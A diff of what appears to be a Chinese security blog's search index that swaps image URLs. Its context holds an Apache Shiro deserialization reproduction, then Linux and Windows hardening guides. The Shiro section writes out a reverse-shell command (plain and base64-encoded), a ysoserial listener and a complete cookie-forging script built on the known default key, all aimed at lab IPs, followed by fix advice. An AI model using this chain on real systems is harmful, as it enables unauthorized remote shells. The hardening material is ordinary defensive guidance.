@@ -45,36 +45,36 @@
 <li>攻击机使用Shiro_exploit爆破默认key（也就是AES加密的密钥）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;192.168.3.130:8080</span><br></pre></td></tr></table></figure>
 爆破出默认key如下：</li>
 </ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080601.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080601.png" alt="image"></p>
 <ol start="2">
 <li><p>攻击机制作反弹shell代码<br>监听本地端口</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure></li>
 <li><p>Java Runtime 配合 bash 编码。<br>在线编码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.131&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080602.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080602.png" alt="image"></p>
 </li>
 <li><p>通过ysoserial中JRMP监听模块，监听8888端口并执行反弹shell命令。</p>
 </li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080603.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080603.png" alt="image"></p>
 <ol start="5">
 <li>使用shiro.py 生成Payload</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.3.131:8888</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080604.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080604.png" alt="image"></p>
 <p>shiro.py代码如下（注意key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)换为第一步爆破出的key）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])   </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>
 
 <h2 id="1-7-构造数据包，伪造cookie，反弹shell"><a href="#1-7-构造数据包，伪造cookie，反弹shell" class="headerlink" title="1.7 构造数据包，伪造cookie，反弹shell"></a>1.7 构造数据包，伪造cookie，反弹shell</h2><ol>
-<li>访问靶机环境（<a href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080605.png" alt="image"></li>
-<li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080606.png" alt="image"></li>
-<li>获得的rememberMe置入cookies中<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080607.png" alt="image"></li>
+<li>访问靶机环境（<a href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="https://qiniu.hzktester.top/tp2020080605.png" alt="image"></li>
+<li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="https://qiniu.hzktester.top/tp2020080606.png" alt="image"></li>
+<li>获得的rememberMe置入cookies中<br><img src="https://qiniu.hzktester.top/tp2020080607.png" alt="image"></li>
 <li>8888端口监听到流量信息</li>
 </ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080608.png" alt="image"><br>5. 2222端口成功反弹shell</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080609.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020080608.png" alt="image"><br>5. 2222端口成功反弹shell</p>
+<p><img src="https://qiniu.hzktester.top/tp2020080609.png" alt="image"></p>
 <h2 id="1-8-修复建议"><a href="#1-8-修复建议" class="headerlink" title="1.8 修复建议"></a>1.8 修复建议</h2><ol>
 <li>升级shiro到1.2.5及以上</li>
 <li>如果在配置里配置了密钥，一定不要使用网上的密钥！！</li>
@@ -88,7 +88,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py | python3</span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>
 <p>python2安装pip</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure>
-<p>检查安装情况<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020080610.png" alt="image"></p>
+<p>检查安装情况<br><img src="https://qiniu.hzktester.top/tp2020080610.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -100,8 +100,8 @@
   <entry>
     <title>linux操作系统加固</title>
     <url>/2020/10/15/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
-    <content><![CDATA[<h1 id="Linux系统基本操作"><a href="#Linux系统基本操作" class="headerlink" title="Linux系统基本操作"></a>Linux系统基本操作</h1><h2 id="文件结构图及关键文件功能"><a href="#文件结构图及关键文件功能" class="headerlink" title="文件结构图及关键文件功能"></a>文件结构图及关键文件功能</h2><h3 id="Linux文件结构"><a href="#Linux文件结构" class="headerlink" title="Linux文件结构"></a>Linux文件结构</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101501.png" alt="image"></p>
-<h3 id="Linux文件结构图"><a href="#Linux文件结构图" class="headerlink" title="Linux文件结构图"></a>Linux文件结构图</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101502.png" alt="image"></p>
+    <content><![CDATA[<h1 id="Linux系统基本操作"><a href="#Linux系统基本操作" class="headerlink" title="Linux系统基本操作"></a>Linux系统基本操作</h1><h2 id="文件结构图及关键文件功能"><a href="#文件结构图及关键文件功能" class="headerlink" title="文件结构图及关键文件功能"></a>文件结构图及关键文件功能</h2><h3 id="Linux文件结构"><a href="#Linux文件结构" class="headerlink" title="Linux文件结构"></a>Linux文件结构</h3><p><img src="https://qiniu.hzktester.top/tp2020101501.png" alt="image"></p>
+<h3 id="Linux文件结构图"><a href="#Linux文件结构图" class="headerlink" title="Linux文件结构图"></a>Linux文件结构图</h3><p><img src="https://qiniu.hzktester.top/tp2020101502.png" alt="image"></p>
 <h3 id="二级目录"><a href="#二级目录" class="headerlink" title="二级目录"></a>二级目录</h3><table>
 <thead>
 <tr>
@@ -201,19 +201,19 @@
 <h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2><h3 id="账号分类："><a href="#账号分类：" class="headerlink" title="账号分类："></a>账号分类：</h3><p>超级管理员  uid=0</p>
 <p>系统默认用户    系统程序使用，从不登录</p>
 <p>新建普通用户    uid大于500</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101503.png" alt="image"></p>
-<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101504.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101503.png" alt="image"></p>
+<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><img src="https://qiniu.hzktester.top/tp2020101504.png" alt="image"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -1 &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">字段1：用户账号的名称</span><br><span class="line">字段2：密码字符串或占位符x</span><br><span class="line">字段3：用户账号的UID号</span><br><span class="line">字段4：所属基本组的GID号</span><br><span class="line">字段5：用户全名</span><br><span class="line">字段6：宿主目录</span><br><span class="line">字段7：登录shell程序的路径</span><br></pre></td></tr></table></figure>
 
-<h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101505.png" alt="image"></p>
+<h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><img src="https://qiniu.hzktester.top/tp2020101505.png" alt="image"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -1 &#x2F;etc&#x2F;shadow</span><br><span class="line"></span><br><span class="line">字段1：用户账号的名称</span><br><span class="line">字段2：加密后的密码字符串</span><br><span class="line">子段3：上次修改密码的时间</span><br><span class="line">字段4：密码的最短有效天数，默认0</span><br><span class="line">字段5：密码的最长有效天数，默认99999</span><br><span class="line">字段6：密码过期前的警告天数，默认7</span><br><span class="line">字段7：密码过期后多少天禁用此用户账号</span><br><span class="line">字段8：账号失效时间，默认值为空</span><br><span class="line">字段9：保留字段（未使用）</span><br></pre></td></tr></table></figure>
 
 <h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test        &#x2F;&#x2F;添加用户test</span><br><span class="line">passwd test         &#x2F;&#x2F;为test用户设置密码</span><br><span class="line">passwd -l test      &#x2F;&#x2F;锁定用户test</span><br><span class="line">passwd -u test      &#x2F;&#x2F;解锁用户test</span><br><span class="line">userdel -r test    &#x2F;&#x2F;删除用户test</span><br><span class="line">id                  &#x2F;&#x2F;查看当前用户</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101506.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101506.png" alt="image"></p>
 <h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="查看权限：ls-l"><a href="#查看权限：ls-l" class="headerlink" title="查看权限：ls -l"></a>查看权限：<code>ls -l</code></h3><p>下图中文件所有者(属主)为root，所有组(属组)为root，文件名为<code>install.log</code>,权限为的第一个减号“-”代表的是文件类型：</p>
-<p>-：普通文件，d:目录文件，l:链接文件，b:设备文件，c:字符设备文件，p:管道文件<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101507.png" alt="image"></p>
+<p>-：普通文件，d:目录文件，l:链接文件，b:设备文件，c:字符设备文件，p:管道文件<br><img src="https://qiniu.hzktester.top/tp2020101507.png" alt="image"></p>
 <p>读(read)，写(write)，执行r(recute)简写即为(r,w,x),亦可用数字来(4,2,1)表示</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101508.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101508.png" alt="image"></p>
 <h3 id="修改权限：chown"><a href="#修改权限：chown" class="headerlink" title="修改权限：chown"></a>修改权限：<code>chown</code></h3><p>chown命令是用于更改文件的用户和组的所有权。要将文件 foo 的用户和组的所有权更改为 root，可以使用以下命令：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）chown root:root foo</span><br><span class="line">2）chown root: foo</span><br></pre></td></tr></table></figure>
 <p>在用户名后跟冒号【: 】运行该命令将同时设置用户和组所有权。</p>
@@ -233,26 +233,26 @@
 <p>使用命令<code>passwd -u &lt;用户名&gt;</code>解锁需要恢复的账号。</p>
 <h2 id="检查shadow中空口令账号"><a href="#检查shadow中空口令账号" class="headerlink" title="检查shadow中空口令账号"></a>检查shadow中空口令账号</h2><p>检查方法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F: &#39;length($2)&#x3D;&#x3D;0 &#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101509.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101509.png" alt="image"></p>
 <p>加固方法：<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定不必要的账户。<br>使用命令<code>passwd -u &lt;用户名&gt;</code>解锁需要恢复的账户。<br>使用命令<code>passwd &lt;用户名&gt;</code>为用户设置密码。</p>
 <h2 id="设置系统密码策略"><a href="#设置系统密码策略" class="headerlink" title="设置系统密码策略"></a>设置系统密码策略</h2><p>执行命令（查看密码策略设置）:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;login.defs|grep PASS</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101510.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101510.png" alt="image"></p>
 <p>加固方法（修改配置文件）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;login.defs</span><br><span class="line"></span><br><span class="line">PASS_MAX_DAYS   90  &#x2F;&#x2F;用户的密码最长使用天数</span><br><span class="line">PASS_MIN_DAYS   0   &#x2F;&#x2F;两次修改密码的最小时间间隔</span><br><span class="line">PASS_MIN_LEN    7   &#x2F;&#x2F;密码的最小长度</span><br><span class="line">PASS_WARN_AGE   9   &#x2F;&#x2F;密码过期前多少天开始提示</span><br></pre></td></tr></table></figure>
 
 <h2 id="禁用root之外的超级用户"><a href="#禁用root之外的超级用户" class="headerlink" title="禁用root之外的超级用户"></a>禁用root之外的超级用户</h2><p>检测方法（检查id为0的用户）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F &quot;:&quot; &#39;($3&#x3D;&#x3D;&quot;0&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101511.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101511.png" alt="image"></p>
 <p>加固方法：<br>使用命令<code>passwd -l &lt;用户名&gt;</code>锁定用户</p>
 <h2 id="限制能够su为root的用户"><a href="#限制能够su为root的用户" class="headerlink" title="限制能够su为root的用户"></a>限制能够su为root的用户</h2><p>使用命令<code>cat /etc/pam.d/su</code>查看是否有<code>auth required /lib/security/pam_wheel.so</code>这样的配置条目</p>
 <p>加固方法：（在头部添加）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth required &#x2F;lib&#x2F;security&#x2F;pam_wheel.so group&#x3D;wheel</span><br></pre></td></tr></table></figure>
 <p>这样，只有wheel组的用户可以su到root</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101512.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101512.png" alt="image"></p>
 <h2 id="重要文件加上不可改变属性"><a href="#重要文件加上不可改变属性" class="headerlink" title="重要文件加上不可改变属性"></a>重要文件加上不可改变属性</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chattr +i &#x2F;etc&#x2F;passwd</span><br><span class="line">chattr +i &#x2F;etc&#x2F;shadow</span><br><span class="line">chattr +i &#x2F;etc&#x2F;gshadow</span><br><span class="line">chattr +i &#x2F;etc&#x2F;group</span><br><span class="line">chattr +i &#x2F;etc&#x2F;inetd.conf</span><br><span class="line">chattr +i &#x2F;etc&#x2F;httpd.conf</span><br></pre></td></tr></table></figure>
 
-<h2 id="Umask安全"><a href="#Umask安全" class="headerlink" title="Umask安全"></a>Umask安全</h2><p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101513.png" alt="image"></p>
+<h2 id="Umask安全"><a href="#Umask安全" class="headerlink" title="Umask安全"></a>Umask安全</h2><p><img src="https://qiniu.hzktester.top/tp2020101513.png" alt="image"></p>
 <blockquote>
 <p>第一个0代表suid 丢弃的权限；<br>第二个0代表本文件/目录拥有者什么权限都没丢弃<br>第三个2代表本文件/目录的用户组丢弃了w权限<br>第四个2代表本文件/目录的其他用户能使用的权限只有有r和x</p>
 </blockquote>
@@ -272,39 +272,39 @@
 <p>添加<code>banner NONE</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;motd</span><br></pre></td></tr></table></figure>
 <p>删除全部内容或更新成自己想要添加的内容</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101514.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101514.png" alt="image"></p>
 <h2 id="仅允许SSH协议版本2"><a href="#仅允许SSH协议版本2" class="headerlink" title="仅允许SSH协议版本2"></a>仅允许SSH协议版本2</h2><blockquote>
 <p>有两个SSH协议版本，仅使用SSH协议版本2会更安全，SSH协议版本1有安全问题，包括中间人攻击<br>（man-in-the-middle）和注入（insertion）攻击。</p>
 </blockquote>
 <p>编辑<code>/etc/ssh/sshd_config</code>文件并查找下面这样的行：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Protocol 2,1</span><br><span class="line">修改为</span><br><span class="line">Protocol 2</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101515.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101515.png" alt="image"></p>
 <h2 id="防止误使用Ctrl-Alt-Del重启系统"><a href="#防止误使用Ctrl-Alt-Del重启系统" class="headerlink" title="防止误使用Ctrl+Alt+Del重启系统"></a>防止误使用Ctrl+Alt+Del重启系统</h2><p>检查方法（查看输出行是否被注释）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;inittab |grep ctrl-alt-del</span><br><span class="line">Ctrl-Alt-Delete is handled by &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;ctrl-alt-del.target</span><br></pre></td></tr></table></figure>
 <p>加固方法（在行开否添加注释符号“#”）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;inittab</span><br><span class="line"># Ctrl-Alt-Delete is handled by &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;ctrl-alt-del.target</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101516.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101516.png" alt="image"></p>
 <h2 id="设置账户锁定登录失败锁定次数、锁定时间"><a href="#设置账户锁定登录失败锁定次数、锁定时间" class="headerlink" title="设置账户锁定登录失败锁定次数、锁定时间"></a>设置账户锁定登录失败锁定次数、锁定时间</h2><p>检查方法（查看有无<code>auth required pam_tally2.so</code>条目的设置）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;pam.d&#x2F;system-auth|grep auth </span><br></pre></td></tr></table></figure>
 <p>加固方法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;pam.d&#x2F;system-auth</span><br><span class="line"></span><br><span class="line">auth required pam_tally2.so onerr&#x3D;fail deny&#x3D;3 unlock_time&#x3D;30 even_deny_root root_unlock_time&#x3D;100</span><br></pre></td></tr></table></figure>
-<p>设置为密码连续错误3次锁定，锁定时间30秒。root密码连续错误3次锁定，时间为 100秒<br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101517.png" alt="image"></p>
+<p>设置为密码连续错误3次锁定，锁定时间30秒。root密码连续错误3次锁定，时间为 100秒<br><img src="https://qiniu.hzktester.top/tp2020101517.png" alt="image"></p>
 <h2 id="修改账户TMOUT值，设置自动注销时间"><a href="#修改账户TMOUT值，设置自动注销时间" class="headerlink" title="修改账户TMOUT值，设置自动注销时间"></a>修改账户TMOUT值，设置自动注销时间</h2><p>检查方法（查看有无TMOUT的设置）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;profile|grep TMOUT </span><br></pre></td></tr></table></figure>
 <p>加固方法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">TMOUT&#x3D;600  &#x2F;&#x2F;增加条目。无操作600秒后自动退出</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101518.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101518.png" alt="image"></p>
 <h2 id="设置BASH保留历史命令的条目"><a href="#设置BASH保留历史命令的条目" class="headerlink" title="设置BASH保留历史命令的条目"></a>设置BASH保留历史命令的条目</h2><p>检查方法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;profile | grep HISTSIZE</span><br></pre></td></tr></table></figure>
 <p>加固方法（修改HISTSIZE=5即保留最新执行的5条命令<br>）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101519.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101519.png" alt="image"></p>
 <h2 id="用户注销时删除命令记录"><a href="#用户注销时删除命令记录" class="headerlink" title="用户注销时删除命令记录"></a>用户注销时删除命令记录</h2><p>检查方法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;skel&#x2F;.bash_logout</span><br></pre></td></tr></table></figure>
 <p>增加如下行：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;skel&#x2F;.bash_logout</span><br><span class="line">rm -f $HOME&#x2F;.bash_history</span><br></pre></td></tr></table></figure>
 <p>这样，系统中的所有用户注销时都会删除其命令记录，如果只需要针对某个特定用户，如root用户进行设置，则可只在该用户的主目录下修改<code>/$HOME/.bash_history</code>文件增加相同的一行即可。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101520.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101520.png" alt="image"></p>
 <h2 id="设置系统日志策略配置文件"><a href="#设置系统日志策略配置文件" class="headerlink" title="设置系统日志策略配置文件"></a>设置系统日志策略配置文件</h2><p>日志的主要用途是<strong>系统审计、监测追踪和分析统计</strong>。<br>为了保证 Linux 系统正常运行、准确解决遇到的各种各样的系统问题，认真地读取日志文件是管理员的一项非常重要的任务。UNIX/Linux采用了syslog工具来实现此功能，如果配置正确的话，所有在主机上发生的事情都会被记录下来，不管是好的还是坏的。</p>
 <p>检查方法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -aef | grep syslog   &#x2F;&#x2F;确定syslog服务是否启用</span><br><span class="line">cat &#x2F;etc&#x2F;rsyslog.conf   &#x2F;&#x2F;查看syslogd的配置文件</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;messages   &#x2F;&#x2F;查看系统日志</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;cron       &#x2F;&#x2F;查看cron日志</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;secure     &#x2F;&#x2F;查看安全日志</span><br></pre></td></tr></table></figure>
@@ -312,7 +312,7 @@
 <h2 id="阻止系统响应任何从外部-内部来的ping请求"><a href="#阻止系统响应任何从外部-内部来的ping请求" class="headerlink" title="阻止系统响应任何从外部/内部来的ping请求"></a>阻止系统响应任何从外部/内部来的ping请求</h2><p>加固方法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>
 <p>执行以上命令，其他客户端就不能ping通服务器了</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101521.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101521.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>安全加固</category>
@@ -508,18 +508,18 @@
 <h2 id="账号及安全策略"><a href="#账号及安全策略" class="headerlink" title="账号及安全策略"></a>账号及安全策略</h2><p>账号安全设置方法：</p>
 <p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p>
 <p>账号锁定策略：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101401.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101401.png" alt="image"></p>
 <p>账号密码策略：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101402.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101402.png" alt="image"></p>
 <h2 id="禁用Guest账户权限"><a href="#禁用Guest账户权限" class="headerlink" title="禁用Guest账户权限"></a>禁用Guest账户权限</h2><p>我的电脑—右击—管理—计算机管理—本地用户和组—用户—Guest—右键—属性—<br>常规—选择“账户已禁用”。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101403.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101403.png" alt="image"></p>
 <p>或使用命令<code>net user guest /active:no</code>(cmd管理员模式执行)</p>
 <h2 id="Administartor账号、组重命名"><a href="#Administartor账号、组重命名" class="headerlink" title="Administartor账号、组重命名"></a>Administartor账号、组重命名</h2><p><code>Administartor</code>账号、组重命名，可增加账号安全性</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101404.png" alt="image"></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101405.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101404.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101405.png" alt="image"></p>
 <h2 id="日志及审核策略"><a href="#日志及审核策略" class="headerlink" title="日志及审核策略"></a>日志及审核策略</h2><p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p>
 <p>对重要事件进行审核记录，方便日后出现问题时查找问题根源。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101406.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101406.png" alt="image"></p>
 <h3 id="调整事件日志的大小及覆盖策略"><a href="#调整事件日志的大小及覆盖策略" class="headerlink" title="调整事件日志的大小及覆盖策略"></a>调整事件日志的大小及覆盖策略</h3><p>设置方法：“开始”—“运行”输入<code>eventvwr.msc</code></p>
 <p>增大日志大小，避免由于日志文件容量过小导致重要日志记录遗漏</p>
 <table>
@@ -546,7 +546,7 @@
 <td>覆盖早于30天的日志</td>
 </tr>
 </tbody></table>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101407.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101408.png" alt="image"><br><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101409.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101407.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020101408.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020101409.png" alt="image"></p>
 <blockquote>
